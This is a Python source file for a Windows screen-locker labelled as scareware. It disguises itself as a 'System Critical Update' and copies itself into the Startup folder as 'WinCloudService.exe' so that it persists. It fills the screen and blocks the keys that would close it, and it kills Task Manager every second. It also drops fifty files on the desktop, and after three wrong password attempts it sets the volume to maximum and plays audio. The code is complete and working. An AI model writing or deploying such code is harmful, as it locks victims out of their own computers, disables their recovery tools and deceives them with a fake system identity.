import tkinter as tk
import os
import sys
import shutil
import threading
import subprocess
import ctypes
import time
import pygame
from PIL import Image, ImageTk, ImageSequence

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def persistencia_usuario():
    if getattr(sys, 'frozen', False):
        ruta_exe = sys.executable
        carpeta_inicio = os.path.join(os.getenv('APPDATA'), 
                                      r'Microsoft\Windows\Start Menu\Programs\Startup')
        destino = os.path.join(carpeta_inicio, "WinCloudService.exe")
        if not os.path.exists(destino):
            try:
                shutil.copy2(ruta_exe, destino)
            except:
                pass

class MalkimaApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Critical Update")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg='black')
        
        self.intentos_fallidos = 0
        pygame.mixer.init() # Inicializar motor de audio
        
        # Bloqueos de cierre
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Control-q>", lambda e: "break")
        self.root.bind("<Control-c>", lambda e: "break")

        # --- CARACTERÍSTICA 4: EL DROPPER (Crear archivos en el escritorio) ---
        self.generar_archivos_escritorio()

        # Interfaz visual
        self.canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg='black', highlightthickness=0)
        self.canvas.pack()
        
        # Texto dinámico de Makima (Inicialmente vacío)
        self.label_mensaje = tk.Label(root, text="", fg="red", bg="black", font=("Arial", 20, "bold"))
        self.label_mensaje.place(relx=0.5, rely=0.1, anchor='center')

        # Cargar GIF
        self.cargar_recursos()

        # Cuadro de entrada
        self.entry = tk.Entry(root, show="*", font=("Arial", 24), justify='center', bg="#1a1a1a", fg="white", insertbackground="white")
        self.entry.place(relx=0.5, rely=0.85, anchor='center')
        self.entry.focus_set()
        self.entry.bind('<Return>', self.verificar)

        # --- CARACTERÍSTICA 1: VIGILANTE DE PROCESOS (Hilo en segundo plano) ---
        hilo_vigilante = threading.Thread(target=self.vigilar_taskmgr, daemon=True)
        hilo_vigilante.start()

    def cargar_recursos(self):
        base_dir = os.path.dirname(os.path.abspath(__file__))
        root_dir = os.path.abspath(os.path.join(base_dir, ".."))
        
        posibles_rutas = [
            os.path.join(root_dir, "assets", "gifmakima.gif"),
            os.path.join(base_dir, "assets", "gifmakima.gif"),
            resource_path("gifmakima.gif"),
            resource_path(os.path.join("assets", "gifmakima.gif"))
        ]

        path_gif = None
        for ruta in posibles_rutas:
            if os.path.exists(ruta):
                path_gif = ruta
                break

        try:
            if path_gif:
                self.img_obj = Image.open(path_gif)
                self.frames = [ImageTk.PhotoImage(img.copy().convert("RGBA")) for img in ImageSequence.Iterator(self.img_obj)]
                self.current_frame = 0
                self.animate_gif()
        except:
            pass

    def animate_gif(self):
        if hasattr(self, 'frames'):
            frame = self.frames[self.current_frame]
            self.canvas.delete("all")
            self.canvas.create_image(self.root.winfo_screenwidth()//2, self.root.winfo_screenheight()//2, image=frame)
            self.current_frame = (self.current_frame + 1) % len(self.frames)
            self.root.after(40, self.animate_gif)

    def generar_archivos_escritorio(self):
        """ Llena el escritorio de archivos de texto """
        try:
            escritorio = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            mensaje = "Realmente creo que solo me gusta una de cada diez películas, pero hay ocasiones en las que algunas me cambian la vida"
            for i in range(1, 51): # Crea 50 archivos
                ruta_archivo = os.path.join(escritorio, f"readme_{i}.txt")
                with open(ruta_archivo, "w", encoding="utf-8") as f:
                    f.write(mensaje)
        except Exception as e:
            pass # Si falla por permisos, ignoramos para no tumbar el programa

    def vigilar_taskmgr(self):
        """ Monitorea y asesina el Administrador de Tareas si se abre """
        while True:
            try:
                # Ejecuta 'tasklist' de forma invisible
                procesos = subprocess.check_output('tasklist', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode()
                if "Taskmgr.exe" in procesos or "taskmgr.exe" in procesos:
                    # Mata el proceso
                    os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
                    # Actualiza el texto en la interfaz (usando .after para evitar errores de hilos en Tkinter)
                    mensaje_makima = "A partir de hoy, serás mi perro. Solo puedes decir 'sí' o 'guau'.\nNo necesito un perro que diga 'no'."
                    self.root.after(0, lambda: self.label_mensaje.config(text=mensaje_makima))
            except:
                pass
            time.sleep(1) # Revisa cada segundo

    def subir_volumen_al_maximo(self):
        """ Simula presionar la tecla de subir volumen 50 veces """
        VK_VOLUME_UP = 0xAF
        for _ in range(50):
            ctypes.windll.user32.keybd_event(VK_VOLUME_UP, 0, 0, 0)
            ctypes.windll.user32.keybd_event(VK_VOLUME_UP, 0, 2, 0) # Soltar tecla

    def verificar(self, event=None):
        if self.entry.get().lower() == "bang":
            self.root.destroy()
        else:
            self.intentos_fallidos += 1
            self.entry.delete(0, tk.END)
            
            # --- CARACTERÍSTICA 2: SCAREWARE AUDITIVO ---
            if self.intentos_fallidos >= 3:
                self.subir_volumen_al_maximo()
                
                # Intentar cargar y reproducir el mp3
                try:
                    path_audio = resource_path(os.path.join("assets", "audio.mp3"))
                    if not os.path.exists(path_audio):
                        path_audio = resource_path("audio.mp3")
                    
                    if os.path.exists(path_audio):
                        pygame.mixer.music.load(path_audio)
                        pygame.mixer.music.play()
                except:
                    pass

if __name__ == "__main__":
    persistencia_usuario()
    root = tk.Tk()
    app = MalkimaApp(root)
    root.mainloop()